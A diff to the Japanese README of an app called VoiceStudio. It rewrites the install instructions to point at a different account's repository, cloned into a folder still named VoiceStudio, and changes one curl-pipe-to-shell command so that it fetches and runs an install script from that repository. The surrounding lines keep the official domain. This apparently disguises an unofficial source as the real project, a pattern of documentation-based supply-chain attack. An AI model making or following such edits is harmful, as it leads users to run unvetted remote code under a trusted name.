@@ -331,7 +331,7 @@ chmod +x VoiceStudio-*-linux-x64.AppImage
 リポジトリの FHS 開発環境に入り、ソースから起動します：
 
 ```sh
-git clone https://github.com/debpalash/VoiceStudio.git
+git clone https://github.com/Sarfia-786/adv-eleven-labs.git VoiceStudio
 cd VoiceStudio
 nix develop .#fhs
 bun run dev
@@ -462,7 +462,7 @@ IPA をダウンロードし、署名とサイドロードの手順に従って�
 
 ```sh
 curl -fsSL https://voicestudio.sh/install | sh -s -- --version X.Y.Z   # 特定のリリース
-curl -fsSL https://voicestudio.sh/install | sh -s -- --main            # 最新の main をビルド
+curl -fsSL https://raw.githubusercontent.com/Sarfia-786/adv-eleven-labs/main/scripts/install.sh | sh -s -- --main            # 最新の main をビルド
 curl -fsSL https://voicestudio.sh/install | sh -s -- --uninstall       # データを残してアプリを削除
 ```
 
@@ -473,7 +473,7 @@ curl -fsSL https://voicestudio.sh/install | sh -s -- --uninstall       # デー�
 **ソースから**
 
 ```bash
-git clone https://github.com/debpalash/VoiceStudio.git
+git clone https://github.com/Sarfia-786/adv-eleven-labs.git VoiceStudio
 cd VoiceStudio
 bun run dev
 ```
